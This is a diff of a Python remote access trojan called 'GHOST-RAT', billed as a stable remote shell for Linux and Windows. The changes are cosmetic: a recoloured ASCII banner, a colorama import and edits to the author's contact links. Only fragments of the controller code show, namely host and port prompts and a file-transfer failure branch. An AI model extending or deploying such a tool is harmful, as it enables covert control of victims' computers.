@@ -2,10 +2,11 @@
 # !} [NOTE] Only for Educational Purpose. [/NOTE]                               {!
 # !} Author: GhostBoy.                                                          {!
 # !} Facebook  : https://www.facebook.com/GhostBoy273/                          {! 
-# !) Telegram  : https://t.me/TheBlackH4t                                       {!
-# !) Instagram : https://www.instagram.com/ezemtz.2222                          {!
+# !} Telegram  : https://t.me/TheBlackH4t                                       {!
+# !} Instagram : https://www.instagram.com/ezemtz.2222                          {!
+# !} Github    : https://www.github.com/GhostBoy-404                            {!
 # !} Lang : Python.                                                             {!
-# !} Product Name : Ghost-Rat [ Simple Rython Rat ]                             {!
+# !} Product Name : GHOST-RAT [ Simple Rython Rat ]                             {!
 # !} ~~ A very stable python remote shell ~~                                    {!
 # !} [X] Only For Linux And Windows [X]                                         {!
 # !} [+] Found any bug. Please contact me drawbox273020@gmail.com :)            {!
@@ -16,19 +17,21 @@ import os
 import sys
 import select
 import time
+from colorama import Fore
 
-print("""
-+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+               
-                                     __             
-  ____________ ___.__.____________ _/  |_            
- /  ___/\____ <   |  |\_  __ \__  \\   __\            
- \___ \ |  |_> >___  | |  | \// __ \|  |             
-/____  >|   __// ____| |__|  (____  /__|               
-     \/ |__|   \/                 \/       
-	   GhostBoy - V-1.0              
-                                               
-+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+             
-  """)
+texto = Fore.LIGHTCYAN_EX+ """
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+               
+                                     __                                
+ ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗   ██████╗  █████╗ ████████╗
+██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝   ██╔══██╗██╔══██╗╚══██╔══╝
+██║  ███╗███████║██║   ██║███████╗   ██║█████╗██████╔╝███████║   ██║   
+██║   ██║██╔══██║██║   ██║╚════██║   ██║╚════╝██╔══██╗██╔══██║   ██║   
+╚██████╔╝██║  ██║╚██████╔╝███████║   ██║      ██║  ██║██║  ██║   ██║   
+ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
+	   GhostBoy - V-1.0                                                             
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+  """
+print(texto)
 
 host = input("host:")
 port = int(input("port:"))
@@ -166,4 +169,3 @@ while True:
                 print("Failed invalid file")
                 socks[activate].send(b'EOFEOFX')
                 pass
-
